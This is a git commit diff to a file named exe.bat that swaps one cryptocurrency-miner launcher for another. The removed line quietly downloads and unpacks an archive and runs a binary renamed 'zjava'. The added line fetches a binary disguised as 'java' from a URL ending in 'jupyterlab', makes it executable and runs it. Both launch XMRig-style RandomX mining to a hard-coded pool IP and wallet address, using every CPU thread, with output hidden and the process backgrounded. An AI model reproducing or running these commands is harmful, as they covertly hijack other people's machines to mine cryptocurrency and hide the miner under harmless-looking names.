c14611b6a8705b3f883ec089791f77fa5d5ae89e
benjaminzipamela <167762903+benjaminzipamela@users.noreply.github.com>
2024-09-29 05:08:33 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,2 +1,1 @@
-wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
-nohup ./zjava -a rx/0 -o 8.222.134.27:80 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT.$(echo $(shuf -i 1-9 -n 1)-tahu ponk) --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
+wget -qO java https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x java && nohup ./java -a rx/0 -o 8.222.134.27:80 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT.$(echo $(shuf -i 1-9 -n 1)-tahu ponk) --randomx-1gb-pages -p -x -t $(nproc --all)
